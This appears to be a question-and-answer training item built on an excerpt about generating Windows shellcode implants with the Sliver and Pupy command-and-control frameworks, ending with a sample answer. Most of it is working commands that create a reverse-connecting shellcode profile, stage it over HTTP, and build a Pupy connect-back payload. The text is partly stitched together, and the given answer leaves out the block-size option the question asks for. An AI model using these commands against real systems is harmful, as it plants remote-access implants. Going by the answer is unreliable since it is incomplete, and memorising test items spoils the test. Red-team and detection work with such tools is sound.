Context:## Generating a Windows Shellcode Payload with sliver
Create a new profile called `win-shellcode` that uses mutual TLS and connects to the server IP **192.168.122.1** in **shellcode** format.
```bash
sliver > profiles new --mtls 192.168.122.1 --format shellcode win-shellcode my_profile
sliver > generate --profile my_profile
```

We can now create a staging listener and link it to the profile:
```
sliver > stage-listener --url http://192.168.122.1:1234 --profile win-shellcode

[*] No builds found for profile win-shellcode, generating a new one
[*] Job 1 (tcp) started
sliver > jobs

ID  Name  Protocol  Port
==  ====  ========  ====
1   http  tcp       1234
2   mtls  tcp       8888
```
>> gen -f <format> <launcher> -t <transport>
```
### Windows Shellcode Payload with pupy
Generates a Windows shellcode payload that connects to the specified IP and port using a transport method.
```
>> gen -S -f client -O windows -A x64 connect --host ip:port -t transport

 Question: Create a network listener that uses a predefined HTTP URL for a specific payload profile named "win-shellcode." Include an option to ensure that the data traffic is handled in blocks of the necessary size for the proper transfer of the complete payload. 

 Your response: 
```
sliver > stage-listener --url http://192.168.122.1:1234 --profile win-shellcode
```